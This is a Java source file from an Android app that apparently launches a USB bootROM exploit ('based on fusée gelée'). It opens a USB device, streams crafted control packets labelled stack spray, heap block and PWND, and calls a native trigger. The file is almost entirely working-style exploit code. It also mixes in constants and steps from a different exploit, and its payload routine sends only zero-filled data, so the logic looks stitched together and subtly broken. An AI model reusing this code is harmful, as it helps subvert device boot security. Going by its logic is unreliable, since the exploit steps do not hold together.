package io.github.davidbuchanan314.nxloader;

/*
 * This exploit is based on fusée gelée: https://github.com/reswitched/fusee-launcher
 */

import android.content.Context;
import android.hardware.usb.UsbConstants;
import android.hardware.usb.UsbDevice;
import android.hardware.usb.UsbDeviceConnection;
import android.hardware.usb.UsbInterface;
import android.hardware.usb.UsbManager;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Arrays;

public class PrimaryLoader implements USBDevHandler {
    
    private static final int GET_STATUS_REQUEST_TYPE = UsbConstants.USB_DIR_IN | UsbConstants.USB_TYPE_STANDARD | 0x00; // standard device GET_STATUS
    private static final int SETUP_VENDOR_OUT_DEVICE = UsbConstants.USB_DIR_OUT | UsbConstants.USB_TYPE_VENDOR | 0x00; // vendor-specific, device recipient
    private static final int REQUEST_HEADER = 0x10;
    private static final int REQUEST_RESERVED = 0x11;
    private static final int REQUEST_STACK_SPRAY = 0x12;
    private static final int REQUEST_HEAP_BLOCK = 0x13;
    private static final int REQUEST_PWND = 0x14;
    private static final int REQUEST_PADDING = 0x15;

    // Used to load the 'native-lib' library on startup.
    static {
        System.loadLibrary("native-lib");
    }

    public void handleDevice(Context context, UsbDevice device) {
        Logger.log(context, "[+] Launching primary payload!!!");

        UsbDeviceConnection conn = null;
        UsbInterface intf = null;

        try {
            // Use hardcoded constants only (do not read example files)
            long rcmAddr = T8Constants.RCM_PAYLOAD_ADDR;
            long intermezzoLoc = T8Constants.INTERMEZZO_LOCATION;
            long payloadBlock = T8Constants.PAYLOAD_LOAD_BLOCK;
            int maxLength = T8Constants.MAX_LENGTH;
            int stackEnd = T8Constants.STACK_END;

            Logger.log(context, "[*] Using constants: RCM_PAYLOAD_ADDR=0x" + Long.toHexString(rcmAddr) + " INTERMEZZO_LOCATION=0x" + Long.toHexString(intermezzoLoc) + " PAYLOAD_LOAD_BLOCK=0x" + Long.toHexString(payloadBlock) + " MAX_LENGTH=" + maxLength + " STACK_END=0x" + Integer.toHexString(stackEnd));

            UsbManager mUsbManager = (UsbManager) context.getSystemService(Context.USB_SERVICE);
            if (mUsbManager == null) {
                Logger.log(context, "[-] UsbManager unavailable");
                return;
            }

            int interfaceCount = device.getInterfaceCount();
            Logger.log(context, "[*] USB device has " + interfaceCount + " interface(s)");
            if (interfaceCount <= 0) {
                Logger.log(context, "[-] No USB interfaces available on device");
                return;
            }

            intf = device.getInterface(0);
            if (intf == null) {
                Logger.log(context, "[-] USB interface 0 not found");
                return;
            }

            Logger.log(context, "[*] Using interface 0 for control transfers");

            conn = mUsbManager.openDevice(device);
            if (conn == null) {
                Logger.log(context, "[-] Failed to open USB device connection");
                return;
            }

            Logger.log(context, "[*] USB device connection opened");

            if (!conn.claimInterface(intf, true)) {
                Logger.log(context, "[-] Failed to claim USB interface");
                return;
            }

            Logger.log(context, "[*] Claimed USB interface successfully");

            /* Step 1: Probe device with a standard GET_STATUS control request */
            byte[] deviceStatus = new byte[2];
            int statusBytes = conn.controlTransfer(GET_STATUS_REQUEST_TYPE,
                    0x00, 0, 0, deviceStatus, deviceStatus.length, 999);
            Logger.log(context, "[*] controlTransfer GET_STATUS returned " + statusBytes + " bytes");
            if (statusBytes > 0) {
                Logger.log(context, "[+] Device status: " + Utils.bytesToHex(deviceStatus));
            }

            // Single-SETUP diagnostic test: send one explicit SETUP packet and log result
            try {
                byte[] testPkt = makeSetupPacket(SETUP_VENDOR_OUT_DEVICE,
                        REQUEST_HEADER,
                        maxLength & 0xFFFF,
                        (maxLength >> 16) & 0xFFFF,
                        0);
                int testRes = conn.controlTransfer(testPkt[0] & 0xFF,
                        testPkt[1] & 0xFF,
                        ((testPkt[3] & 0xFF) << 8) | (testPkt[2] & 0xFF),
                        ((testPkt[5] & 0xFF) << 8) | (testPkt[4] & 0xFF),
                        null,
                        0,
                        5000);
                Logger.log(context, "[*] Single-SETUP test returned " + testRes);
                if (testRes < 0) {
                    Logger.log(context, "[-] Single-SETUP rejected by device (aborting full stream)");
                    return;
                }
            } catch (Exception e) {
                Logger.log(context, "[-] Exception during single-SETUP test: " + e.toString());
                return;
            }

            Logger.log(context, "[*] Building explicit SETUP packet stream from exploit semantics");
            byte[] setupStream = buildSetupPacketStream(maxLength, rcmAddr, intermezzoLoc, payloadBlock, context);
            Logger.log(context, "[*] Built SETUP stream of " + setupStream.length + " bytes");

            Logger.log(context, "[*] Sending payload via control transfers (endpoint 0)");
            int bytes_sent = sendPayloadViaControl(conn, setupStream, context);
            if (bytes_sent < 0) {
                Logger.log(context, "[-] Control transfer payload failed");
                return;
            }
            Logger.log(context, "[+] Sent " + bytes_sent + " bytes of payload via control transfers");

            Logger.log(context, "[*] Triggering exploit with fd=" + conn.getFileDescriptor() + " stackEnd=0x" + Integer.toHexString(stackEnd));
            int result = nativeTriggerExploit(conn.getFileDescriptor(), stackEnd);
            Logger.log(context, "[*] nativeTriggerExploit returned " + result);

            switch (result) {
                case 0:
                    Logger.log(context, "[+] Exploit triggered!");
                    break;
                case -1:
                    Logger.log(context, "[-] SUBMITURB failed :(");
                    break;
                case -2:
                    Logger.log(context, "[-] DISCARDURB failed :(");
                    break;
                case -3:
                    Logger.log(context, "[-] REAPURB failed :(");
                    break;
                case -4:
                    Logger.log(context, "[-] Wrong URB reaped :( Maybe that doesn't matter?");
                    break;
                default:
                    Logger.log(context, "[-] Unexpected native trigger result: " + result);
                    break;
            }
        } catch (Exception e) {
            Logger.log(context, "[-] Exception in PrimaryLoader.handleDevice: " + e.toString());
        } finally {
            if (conn != null && intf != null) {
                try {
                    conn.releaseInterface(intf);
                    Logger.log(context, "[*] Released USB interface");
                } catch (Exception e) {
                    Logger.log(context, "[-] Failed to release USB interface: " + e.toString());
                }
            }
            if (conn != null) {
                try {
                    conn.close();
                    Logger.log(context, "[*] Closed USB connection");
                } catch (Exception e) {
                    Logger.log(context, "[-] Failed to close USB connection: " + e.toString());
                }
            }
        }
    }

    private int sendPayloadViaControl(UsbDeviceConnection conn, byte[] payload, Context context) {
        if (payload.length % 8 != 0) {
            Logger.log(context, "[-] Invalid payload length: not aligned to 8-byte SETUP packets");
            return -1;
        }

        int totalSent = 0;
        int packetIndex = 0;
        int offset = 0;

        while (offset < payload.length) {
            byte[] chunk = new byte[8];
            System.arraycopy(payload, offset, chunk, 0, 8);

            int requestType = chunk[0] & 0xFF;
            int request = chunk[1] & 0xFF;
            int value = (chunk[3] & 0xFF) << 8 | (chunk[2] & 0xFF);
            int index = (chunk[5] & 0xFF) << 8 | (chunk[4] & 0xFF);
            int length = (chunk[7] & 0xFF) << 8 | (chunk[6] & 0xFF);

            Logger.log(context, "[*] Sending SETUP packet " + packetIndex + " type=0x" + Integer.toHexString(requestType) + " req=0x" + Integer.toHexString(request) + " value=0x" + Integer.toHexString(value) + " index=0x" + Integer.toHexString(index) + " length=" + length + " offset=" + offset);

            byte[] dataStage = null;
            if (length > 0) {
                if ((requestType & UsbConstants.USB_DIR_IN) != 0) {
                    dataStage = new byte[length];
                } else {
                    dataStage = new byte[length];
                    Arrays.fill(dataStage, (byte) 0x00);
                }
            }

            int result = conn.controlTransfer(requestType,
                    request,
                    value,
                    index,
                    dataStage,
                    length,
                    999);

            Logger.log(context, "[*] controlTransfer returned " + result + " for packet " + packetIndex);
            if (result < 0) {
                Logger.log(context, "[-] Setup packet " + packetIndex + " failed; aborting exploit stream");
                return -1;
            }

            totalSent += 8;
            offset += 8;
            packetIndex++;
        }

        return totalSent;
    }

    private byte[] buildSetupPacketStream(int maxLength, long rcmAddr, long intermezzoLoc, long payloadBlock, Context context) {
        ByteArrayOutputStream stream = new ByteArrayOutputStream();

        try {
            stream.write(makeSetupPacket(SETUP_VENDOR_OUT_DEVICE,
                    REQUEST_HEADER,
                    maxLength & 0xFFFF,
                    (maxLength >> 16) & 0xFFFF,
                    0));
            Logger.log(context, "[*] Added initial setup packet encoding MAX_LENGTH=" + maxLength);

            int reservedPackets = (676 + 7) / 8;
            for (int i = 0; i < reservedPackets; i++) {
                stream.write(makeSetupPacket(SETUP_VENDOR_OUT_DEVICE,
                        REQUEST_RESERVED,
                        0,
                        0,
                        0));
            }
            Logger.log(context, "[*] Added " + reservedPackets + " reserved SETUP packets");

            int stackFillCount = (int) ((intermezzoLoc - rcmAddr) / 4);
            for (int i = 0; i < stackFillCount; i++) {
                stream.write(makeSetupPacket(SETUP_VENDOR_OUT_DEVICE,
                        REQUEST_STACK_SPRAY,
                        (int) (intermezzoLoc & 0xFFFF),
                        (int) ((intermezzoLoc >> 16) & 0xFFFF),
                        0));
            }
            Logger.log(context, "[*] Added " + stackFillCount + " stack spray SETUP packets");

            for (long blk : T8Constants.HEAP_BLOCKS) {
                stream.write(makeSetupPacket(SETUP_VENDOR_OUT_DEVICE,
                        REQUEST_HEAP_BLOCK,
                        (int) (blk & 0xFFFF),
                        (int) ((blk >> 16) & 0xFFFF),
                        0));
            }
            Logger.log(context, "[*] Added " + T8Constants.HEAP_BLOCKS.length + " heap block SETUP packets");

            try {
                byte[] pw = T8Constants.PWND_STR.getBytes("US-ASCII");
                for (int i = 0; i < pw.length; i += 4) {
                    int chunk = 0;
                    for (int j = 0; j < 4 && i + j < pw.length; j++) {
                        chunk |= (pw[i + j] & 0xFF) << (8 * j);
                    }
                    stream.write(makeSetupPacket(SETUP_VENDOR_OUT_DEVICE,
                            REQUEST_PWND,
                            chunk & 0xFFFF,
                            (chunk >> 16) & 0xFFFF,
                            0));
                }
                Logger.log(context, "[*] Added PWND string as explicit SETUP payload packets");
            } catch (Exception e) {
                Logger.log(context, "[-] Failed to append PWND string as SETUP packets: " + e.toString());
            }

            int paddingPackets = (int) ((payloadBlock - intermezzoLoc) / 8);
            paddingPackets = Math.max(0, paddingPackets);
            for (int i = 0; i < paddingPackets; i++) {
                stream.write(makeSetupPacket(SETUP_VENDOR_OUT_DEVICE,
                        REQUEST_PADDING,
                        0,
                        0,
                        0));
            }
            Logger.log(context, "[*] Added " + paddingPackets + " padding SETUP packets to align to payload block");

            byte[] streamBytes = stream.toByteArray();
            Logger.log(context, "[*] Built " + (streamBytes.length / 8) + " explicit SETUP packets (" + streamBytes.length + " bytes)");
            return streamBytes;
        } catch (IOException e) {
            Logger.log(context, "[-] IOException building SETUP packet stream: " + e.toString());
            return new byte[0];
        }
    }

    private byte[] makeSetupPacket(int requestType, int request, int value, int index, int length) {
        byte[] packet = new byte[8];
        packet[0] = (byte) requestType;
        packet[1] = (byte) request;
        packet[2] = (byte) (value & 0xFF);
        packet[3] = (byte) ((value >> 8) & 0xFF);
        packet[4] = (byte) (index & 0xFF);
        packet[5] = (byte) ((index >> 8) & 0xFF);
        packet[6] = (byte) (length & 0xFF);
        packet[7] = (byte) ((length >> 8) & 0xFF);
        return packet;
    }


    /**
     * A native method that is implemented by the 'native-lib' native library,
     * which is packaged with this application.
     */
    public native int nativeTriggerExploit(int fd, int length);
}
